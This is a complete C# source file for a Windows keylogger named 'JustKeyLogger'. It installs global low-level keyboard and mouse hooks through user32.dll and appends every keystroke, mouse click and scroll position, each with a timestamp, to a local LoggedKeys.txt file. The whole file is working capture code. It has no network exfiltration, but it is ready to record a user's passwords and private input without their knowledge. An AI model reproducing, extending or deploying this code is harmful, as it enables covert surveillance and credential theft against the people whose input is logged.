using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Drawing;
using System.Diagnostics;

namespace JustKeyLogger
{
    static class Logger
    {
        private static int WH_KEYBOARD_LL = 13;
        private static int WH_MOUSE_LL = 14;
        private static int WH_KEYDOWN = 0x0100;
        private static int WM_LBUTTONDOWN = 0x0201;
        private static int WM_RBUTTONDOWN = 0x0204;
        private static int WM_MOUSEWHEEL = 0x020A;
        private static IntPtr keyHook = IntPtr.Zero;
        private static IntPtr mouseHook = IntPtr.Zero;
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private delegate IntPtr LowLevelMouseProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static StreamWriter sw;

        private static LowLevelKeyboardProc llkProcedure = HookCallBack;
        private static LowLevelMouseProc llmProcedure = HookCallBack;

        public static void Start(string logFilePath)
        {
            sw = GetTxtFileStreamWriter(logFilePath);

            keyHook = SetKeyboardHook(llkProcedure);
            mouseHook = SetMouseHook(llmProcedure);
        }

        public static void Stop()
        {
            try
            {
                sw.Close();
            }
            catch (Exception exception)
            {
                Console.WriteLine(exception.Message);
            }

            UnhookWindowsHookEx(keyHook);
            UnhookWindowsHookEx(mouseHook);
        }

        private static IntPtr HookCallBack(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && sw != null)
            {
                if (wParam == (IntPtr)WH_KEYDOWN)
                {
                    int vkCode = Marshal.ReadInt32(lParam);

                    String vkCodeString = ((Keys)vkCode).ToString();

                    switch (vkCodeString)
                    {
                        case "OemPeriod":
                            vkCodeString = ".";
                            break;
                        case "Oemcomma":
                            vkCodeString = ",";
                            break;
                        case "OemQuestion":
                            vkCodeString = "/";
                            break;
                        case "Oemtilde":
                            vkCodeString = "`";
                            break;
                        case "OemMinus":
                            vkCodeString = "-";
                            break;
                        case "Oemplus":
                            vkCodeString = "=";
                            break;
                        case "Oem5":
                            vkCodeString = "\\";
                            break;
                        case "OemOpenBrackets":
                            vkCodeString = "[";
                            break;
                        case "Oem6":
                            vkCodeString = "]";
                            break;
                        case "Oem1":
                            vkCodeString = ";";
                            break;
                        case "Oem7":
                            vkCodeString = "'";
                            break;
                        default:
                            break;
                    }
                    try
                    {
                        sw.WriteLine(DateTime.Now.ToString() + " -> " + vkCodeString);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.Message);
                    }
                }
                else if (wParam == (IntPtr)WM_LBUTTONDOWN)
                {
                    Point MPos = Cursor.Position;

                    try
                    {
                        sw.WriteLine(DateTime.Now.ToString() + " -> Left Mouse Click at: " + MPos.X + " " + MPos.Y);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.Message);
                    }
                }
                else if (wParam == (IntPtr)WM_RBUTTONDOWN)
                {
                    Point MPos = Cursor.Position;

                    try
                    {
                        sw.WriteLine(DateTime.Now.ToString() + " -> Right Mouse Click at: " + MPos.X + " " + MPos.Y);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.Message);
                    }

                }
                else if (wParam == (IntPtr)WM_MOUSEWHEEL)
                {
                    Point MPos = Cursor.Position;

                    try
                    {
                        sw.WriteLine(DateTime.Now.ToString() + " -> Mouse Scroll at: " + MPos.X + " " + MPos.Y);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine(e.Message);
                    }

                }

                try
                {
                    sw.Flush();
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }
            }

            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private static IntPtr SetKeyboardHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);

            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, moduleHandle, 0);
        }

        private static IntPtr SetMouseHook(LowLevelMouseProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);

            return SetWindowsHookEx(WH_MOUSE_LL, proc, moduleHandle, 0);
        }

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelMouseProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private static StreamWriter GetTxtFileStreamWriter(string logFilePath)
        {
            if (!Directory.Exists(logFilePath))
            {
                try
                {
                    Directory.CreateDirectory(logFilePath);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                    Application.Exit();
                }
            }

            string filePath = logFilePath + @"\LoggedKeys.txt";

            if (!File.Exists(filePath))
            {
                try
                {
                    return File.CreateText(filePath);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                    Application.Exit();
                }

            }

            return new StreamWriter(filePath, true);
        }
    }
}
